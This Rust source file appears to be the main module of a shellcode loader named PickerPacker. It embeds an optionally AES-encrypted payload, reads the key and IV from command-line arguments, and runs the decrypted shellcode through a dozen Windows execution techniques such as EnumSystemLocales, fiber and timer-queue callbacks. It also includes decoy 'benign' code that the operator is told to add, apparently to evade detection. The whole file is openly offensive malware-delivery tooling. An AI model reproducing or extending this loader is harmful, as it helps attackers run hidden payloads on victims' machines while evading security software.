use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};
use windows::core::{PSTR, s};
use std::ffi::c_void;

#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
use std::env;

#[cfg(any(feature = "ShellcodeExecuteDefault", feature = "ShellcodeExecuteFiber", feature = "ShellcodeExecuteCreateTimerQueueTimer", feature = "ShellcodeExecuteEnumUILanguages", feature = "ShellcodeExecuteVerifierEnumerate", feature = "ShellcodeExecuteEnumChildWindows", feature = "ShellcodeExecuteEnumDesktopWindows", feature = "ShellcodeExecuteEnumSystemLocales", feature = "ShellcodeExecuteCertEnumSystemStoreLocation", feature = "ShellcodeExecuteEnumWindowStations", feature = "ShellcodeExecuteEnumDisplayMonitors", feature = "ShellcodeExecuteImageGetDigestStream"))]
mod execution;

#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
mod aes;

#[cfg(feature = "embedded")]
const ENCPAYLOAD: &[u8] = &[];  // will be replaced with the (encrypted) payload data

#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
fn hex_to_bytes(hex_str: &str) -> Result<Vec<u8>, String> {
    if hex_str.len() % 2 != 0 {
        return Err("Hex string must have even length".to_string());
    }
    
    let mut bytes = Vec::new();
    for i in (0..hex_str.len()).step_by(2) {
        let byte_str = &hex_str[i..i+2];
        match u8::from_str_radix(byte_str, 16) {
            Ok(byte) => bytes.push(byte),
            Err(_) => return Err(format!("Invalid hex characters: {}", byte_str)),
        }
    }
    Ok(bytes)
}

/// Returns (key_bytes, iv_bytes) if valid, otherwise exits with error
#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
fn parse_and_validate_aes_args() -> (Vec<u8>, Vec<u8>) {
    let args: Vec<String> = env::args().collect();
    let mut aes_key_str = String::new();
    let mut aes_iv_str = String::new();
    
    // Parse command-line arguments
    for i in 0..args.len() {
        match args[i].as_str() {
            "--key" if i < args.len() - 1 => aes_key_str = args[i + 1].clone(),
            "--iv" if i < args.len() - 1 => aes_iv_str = args[i + 1].clone(),
            _ => {}
        }
    }
    
    // Check if key and IV are provided
    if aes_key_str.is_empty() || aes_iv_str.is_empty() {
        eprintln!("[-] Error: AES decryption requires both --key and --iv arguments");
        eprintln!("    Usage: PickerPacker.exe --key <64_hex_chars> --iv <32_hex_chars>");
        std::process::exit(1);
    }
    
    // Validate and convert key
    let aes_key = match hex_to_bytes(&aes_key_str) {
        Ok(bytes) if bytes.len() == 32 => bytes,
        Ok(_) => {
            std::process::exit(1);
        }
        Err(e) => {
            std::process::exit(1);
        }
    };
    
    // Validate and convert IV
    let aes_iv = match hex_to_bytes(&aes_iv_str) {
        Ok(bytes) if bytes.len() == 16 => bytes,
        Ok(_) => {
            std::process::exit(1);
        }
        Err(e) => {
            std::process::exit(1);
        }
    };
    
    (aes_key, aes_iv)
}

/// Decrypt payload using the appropriate AES method
#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
fn decrypt_payload(encrypted: &[u8], key: &[u8], iv: &[u8]) -> Option<Vec<u8>> {
    #[cfg(feature = "TinyAES")]
    {
        return aes::aes_decrypt(encrypted, key, iv);
    }
    
    #[cfg(feature = "CTAES")]
    {
        return aes::ctaes_decrypt(encrypted, key, iv);
    }
}

fn main() {

    /*
    For the Operator -> Write some benign code that is to be executed (Optional)
     */

        // Validate AES arguments FIRST if AES encryption is enabled
        #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
        let (aes_key, aes_iv) = parse_and_validate_aes_args();

        //Benign Stuff
        #[cfg(feature = "messagebox")]
        unsafe {
            MessageBoxA(
                None,
                s!("Hello World"),
                s!("Hello"),
                MB_OK,
            );
        }

        #[cfg(feature = "calculation")]
        fn calculate()
        {
            let mut result = 0;
            for i in 0..10000 {
                result += i;
            }
            println!("Result: {}", result);
        }
        #[cfg(feature = "calculation")]
        calculate();

        // Execute shellcode without AES decryption
        #[cfg(all(feature = "embedded", not(feature = "TinyAES"), not(feature = "CTAES")))]
        {
            let shellcode = ENCPAYLOAD.to_vec();
            
            #[cfg(feature = "ShellcodeExecuteDefault")]
            execution::shellcode_execute_default(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteFiber")]
            execution::shellcode_execute_fiber(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
            execution::shellcode_execute_createtimerqueuetimer(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
            execution::shellcode_execute_enumuilanguages(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
            execution::shellcode_execute_verifierenumerate(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
            execution::shellcode_execute_enumchildwindows(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
            execution::shellcode_execute_enumdesktopwindows(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
            execution::shellcode_execute_enumsystemlocales(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
            execution::shellcode_execute_certenumsystemstorelocation(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
            execution::shellcode_execute_enumwindowstations(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
            execution::shellcode_execute_enumdisplaymonitors(shellcode);
            
            #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
            execution::shellcode_execute_imagegetdigeststream(shellcode);
        }

        // Execute shellcode with AES decryption
        #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
        {
            let encrypted_shellcode = ENCPAYLOAD;
            if let Some(decrypted_shellcode) = decrypt_payload(encrypted_shellcode, &aes_key, &aes_iv) {
                #[cfg(feature = "ShellcodeExecuteDefault")]
                execution::shellcode_execute_default(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteFiber")]
                execution::shellcode_execute_fiber(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
                execution::shellcode_execute_createtimerqueuetimer(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
                execution::shellcode_execute_enumuilanguages(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
                execution::shellcode_execute_verifierenumerate(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
                execution::shellcode_execute_enumchildwindows(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
                execution::shellcode_execute_enumdesktopwindows(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
                execution::shellcode_execute_enumsystemlocales(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
                execution::shellcode_execute_certenumsystemstorelocation(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
                execution::shellcode_execute_enumwindowstations(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
                execution::shellcode_execute_enumdisplaymonitors(decrypted_shellcode);
                
                #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
                execution::shellcode_execute_imagegetdigeststream(decrypted_shellcode);
            }
        }
}